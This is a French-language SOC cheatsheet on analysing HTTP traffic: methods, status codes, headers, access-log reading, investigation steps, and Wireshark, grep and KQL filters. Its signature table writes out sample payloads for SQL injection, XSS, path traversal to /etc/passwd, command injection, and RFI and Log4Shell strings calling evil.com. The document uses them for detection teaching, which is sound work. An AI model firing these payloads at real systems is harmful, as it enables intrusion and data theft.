# Cheatsheet – Analyse du trafic Web (HTTP)

Mémo pour l'analyse de requêtes HTTP en investigation (SOC) : logs web, Wireshark, SIEM.

---

## Principe

HTTP fonctionne en **requête → réponse**.
Le **client** (navigateur, script, malware) envoie une **requête**, et le **serveur** renvoie une **réponse** avec un **code de statut**.

> Règle d'or : **la requête dit ce que le client veut, le code de statut dit si ça a marché.**
> Une attaque qui reçoit des `404` a échoué ; une attaque suivie d'un `200` mérite une investigation.

Une requête se compose de 3 parties :

```
GET /login.php?user=admin HTTP/1.1          ← ligne de requête (méthode + URI + version)
Host: www.quicklogistics.com                ← headers
User-Agent: Mozilla/5.0 ...
Cookie: session=abc123
                                            ← ligne vide
(body : vide en GET, rempli en POST)        ← corps
```

---

## 1. Les méthodes HTTP (le verbe : « je veux faire quoi ? »)

| Méthode | Ce qu'elle fait | Où sont les données | À retenir |
|---|---|---|---|
| `GET` | **récupérer** une ressource (page, image, fichier) | dans l'**URL** (`?param=valeur`) | visibles dans les logs → les payloads d'attaque y apparaissent en clair |
| `POST` | **envoyer** des données (formulaire, login, upload) | dans le **body** | **pas dans les logs d'accès classiques** → il faut le PCAP ou un WAF pour voir le contenu |
| `PUT` | **créer / remplacer** une ressource à un emplacement | body | sur un serveur web classique = **drapeau rouge** (upload de webshell) |
| `DELETE` | **supprimer** une ressource | URL | rare côté site public → suspect |
| `HEAD` | comme `GET` mais **sans le body** (headers seuls) | — | souvent utilisé par les **scanners** pour tester l'existence de pages |
| `OPTIONS` | demande quelles méthodes sont **autorisées** | — | reconnaissance |
| `PATCH` | **modifier partiellement** une ressource | body | APIs |
| `CONNECT` | ouvrir un **tunnel** (proxy, HTTPS) | — | tentative d'utiliser le serveur comme proxy = suspect |
| `TRACE` | renvoie la requête telle que reçue (debug) | — | doit être désactivé ; s'il répond → vulnérabilité (XST) |

**Moyen mnémotechnique :** **GET = je lis**, **POST = j'envoie**, **PUT = je dépose**, **DELETE = j'efface**.

> **GET vs POST, le piège classique** : un login en `GET` met le mot de passe **dans l'URL**,
> donc dans les logs, l'historique et le Referer. Un login en `POST` le met dans le body,
> invisible dans les logs d'accès, mais **pas chiffré pour autant** si on est en HTTP et non en HTTPS.

---

## 2. Codes de statut (la réponse : « ça a marché ? »)

Le **premier chiffre** donne la famille :

| Famille | Sens | Mémo |
|---|---|---|
| `1xx` | Information | « attends » |
| `2xx` | **Succès** | « OK » |
| `3xx` | **Redirection** | « va voir ailleurs » |
| `4xx` | **Erreur client** | « **tu** t'es trompé » |
| `5xx` | **Erreur serveur** | « **je** me suis planté » |

Les codes à connaître par cœur :

| Code | Signification | Lecture SOC |
|---|---|---|
| `200` OK | requête réussie | si c'est la réponse à une attaque → **elle a peut-être fonctionné** |
| `201` Created | ressource créée | après un `PUT`/`POST` suspect → fichier déposé ? |
| `204` No Content | succès, sans contenu | fréquent sur les **beacons** C2 |
| `301` / `302` | redirection (permanente / temporaire) | `302` après un login = **connexion réussie** dans beaucoup d'applis |
| `304` Not Modified | ressource en cache | trafic normal |
| `400` Bad Request | requête mal formée | payload qui casse la syntaxe, fuzzing |
| `401` Unauthorized | **authentification requise / échouée** | beaucoup de `401` = **brute force** |
| `403` Forbidden | **accès refusé** (même authentifié) | WAF qui bloque, ou accès à une zone protégée |
| `404` Not Found | ressource inexistante | **beaucoup de `404` d'une même IP = scan / énumération de répertoires** |
| `405` Method Not Allowed | méthode refusée | test de `PUT`/`DELETE` par un scanner |
| `429` Too Many Requests | limitation de débit | brute force ralenti |
| `500` Internal Server Error | le serveur a planté | une **injection SQL** peut provoquer des `500` → indice d'une vulnérabilité |
| `502` / `503` | passerelle / service indisponible | éventuel **DoS** |

**1er réflexe :** une rafale de `404`, `401` ou `403` puis **un `200`** = l'attaquant a trouvé quelque chose.

---

## 3. Headers importants (souvent falsifiables)

Déclarés par le client → un attaquant met ce qu'il veut. À vérifier, pas à croire.

| Header | Ce qu'il dit | Piège / intérêt SOC |
|---|---|---|
| `Host` | domaine visé | une IP au lieu d'un nom de domaine = scan automatisé |
| `User-Agent` | logiciel client | **spoofable**, mais très parlant quand il n'est pas modifié : `sqlmap`, `Nikto`, `gobuster`, `curl`, `python-requests`, `Wget`, `nmap` |
| `Referer` | page d'où vient le client | absent ou incohérent = requête directe/scriptée |
| `Cookie` | session de l'utilisateur | vol de session (session hijacking), payloads injectés |
| `Authorization` | identifiants (ex. `Basic dXNlcjpwYXNz`) | **`Basic` = base64, pas du chiffrement** → décodable en un clic |
| `X-Forwarded-For` | IP réelle du client derrière un proxy | **spoofable** → l'attaquant peut s'en servir pour masquer son IP ou contourner une restriction |
| `Content-Type` | type du body envoyé | `multipart/form-data` = **upload de fichier** |
| `Content-Length` | taille du body | body anormalement gros = upload ou exfiltration |

Côté **réponse** du serveur :

| Header | Intérêt |
|---|---|
| `Server` | logiciel et version (`Apache/2.4.29`) → aide l'attaquant à cibler des CVE |
| `Set-Cookie` | création de session → souvent la preuve d'une **connexion réussie** |
| `Location` | cible d'une redirection `3xx` |

---

## 4. Lire un log d'accès (Apache / Nginx – format « combined »)

```
203.0.113.5 - - [26/Nov/2025:10:00:00 +0100] "GET /admin.php?id=1' OR 1=1-- HTTP/1.1" 200 5320 "-" "sqlmap/1.7"
```

| Élément | Valeur | Sens |
|---|---|---|
| IP client | `203.0.113.5` | **IOC** |
| Date | `[26/Nov/2025:10:00:00 +0100]` | horodatage |
| Requête | `"GET /admin.php?id=1' OR 1=1-- HTTP/1.1"` | méthode + URI + version |
| Statut | `200` | **ça a marché** |
| Taille | `5320` | octets renvoyés (une taille **anormalement grande** = fuite de données ?) |
| Referer | `"-"` | aucun → requête directe |
| User-Agent | `"sqlmap/1.7"` | **outil d'attaque, pas de doute** |

> Rappel : le **body des `POST` n'apparaît pas** dans ce log. Seule l'URI est visible.

---

## 5. Signatures d'attaques courantes (dans l'URL ou le body)

Les payloads sont souvent **URL-encodés** : il faut **décoder avant de lire** (voir le rappel en bas).

| Attaque | Ce qu'on cherche | Exemple |
|---|---|---|
| **Injection SQL (SQLi)** | `'`, `OR 1=1`, `UNION SELECT`, `--`, `SLEEP(`, `information_schema` | `?id=1' UNION SELECT user,pass FROM users--` |
| **XSS** | `<script>`, `onerror=`, `javascript:`, `alert(` | `?q=<script>alert(1)</script>` |
| **Path Traversal / LFI** | `../`, `..%2f`, `/etc/passwd`, `C:\Windows\win.ini` | `?page=../../../../etc/passwd` |
| **RFI** | une URL externe en paramètre | `?page=http://evil.com/shell.txt` |
| **Command Injection** | `;`, `|`, `&&`, `` ` ``, `$(`, `whoami`, `id`, `cat` | `?ip=127.0.0.1;whoami` |
| **Webshell** | fichier `.php`/`.jsp`/`.aspx` inconnu + paramètre de commande | `POST /uploads/shell.php` puis `?cmd=whoami` |
| **Énumération de répertoires** | rafale de `404` sur des chemins typiques | `/admin`, `/backup`, `/.git`, `/wp-login.php` |
| **Brute force** | nombreux `POST /login` + `401` / page d'erreur, même IP | puis un `302` ou `200` = **compte compromis** |
| **Log4Shell** | `${jndi:` | `User-Agent: ${jndi:ldap://evil.com/a}` |

---

## 6. Méthode (dans l'ordre)

1. **Repérer les IP bruyantes** : volume de requêtes par IP, rafales de `404` / `401`.
2. **Regarder le `User-Agent`** → outil d'attaque connu ?
3. **Lire les URI / body** → payloads (SQLi, XSS, traversal, commandes…), en les **décodant**.
4. **Regarder le code de statut** → l'attaque a-t-elle **réussi** (`200`, `302`, `201`) ?
5. **Suivre la suite** : upload → appel du fichier déposé → commandes → connexion sortante.
6. **Extraire les IOC** : IP, User-Agent, URI malveillantes, fichiers déposés.
7. **Pivoter** : IP et domaines dans AbuseIPDB, VirusTotal…

---

## 7. Outils

**Wireshark :**

```
http                                   # tout le HTTP
http.request                           # uniquement les requêtes
http.request.method == "GET"           # requêtes GET
http.request.method == "POST"          # requêtes POST (logins, uploads)
http.response.code == 200              # réponses OK
http.response.code >= 400              # erreurs (scan, brute force)
http.user_agent contains "sqlmap"      # outil d'attaque
http.request.uri contains "../"        # path traversal
http.host == "exemple.com"             # un site précis
```

→ **Clic droit > Follow > HTTP Stream** pour lire l'échange complet (requête + réponse).
→ **File > Export Objects > HTTP** pour récupérer les fichiers transférés.
→ **Statistics > HTTP > Requests** pour une vue d'ensemble des URI demandées.

**Ligne de commande (logs) :**

```bash
# top des IP les plus actives
cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head

# répartition des codes de statut
awk '{print $9}' access.log | sort | uniq -c | sort -rn

# User-Agents utilisés
awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn

# chercher des payloads typiques
grep -iE "union|select|<script|\.\./|etc/passwd|cmd=|whoami" access.log

# toutes les requêtes d'une IP suspecte
grep "203.0.113.5" access.log
```

**Kibana / KQL :**

```
http.request.method : "POST" and url.path : *login*
http.response.status_code >= 400
user_agent.original : *sqlmap*
url.original : *etc/passwd*
```

**En ligne :** CyberChef (décodage), URL Decoder, VirusTotal, AbuseIPDB.

---

## Rappel : décoder une URL encodée

Les caractères spéciaux sont encodés en `%` + code hexadécimal :

| Encodé | Caractère | Encodé | Caractère |
|---|---|---|---|
| `%20` ou `+` | espace | `%3C` | `<` |
| `%27` | `'` | `%3E` | `>` |
| `%22` | `"` | `%2F` | `/` |
| `%3D` | `=` | `%2E` | `.` |
| `%3B` | `;` | `%7C` | `|` |

```
%3Cscript%3Ealert(1)%3C%2Fscript%3E   →   <script>alert(1)</script>
..%2F..%2Fetc%2Fpasswd                →   ../../etc/passwd
```

```bash
# décoder en ligne de commande
python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" "%3Cscript%3E"
```

⚠️ Un payload peut être **double-encodé** (`%252F` → `%2F` → `/`) pour contourner un filtre : il faut décoder jusqu'à ce que la chaîne ne change plus. Dans CyberChef, enchaîne plusieurs **URL Decode**.

> **HTTPS** : le contenu (URL, headers, body) est **chiffré**. Sur le réseau, tu ne vois que l'IP, le port `443`
> et le nom de domaine (**SNI** dans le TLS Client Hello : filtre `tls.handshake.extensions_server_name`).
> Pour voir le reste, il faut les **logs du serveur**, un **proxy** ou les **clés TLS**.
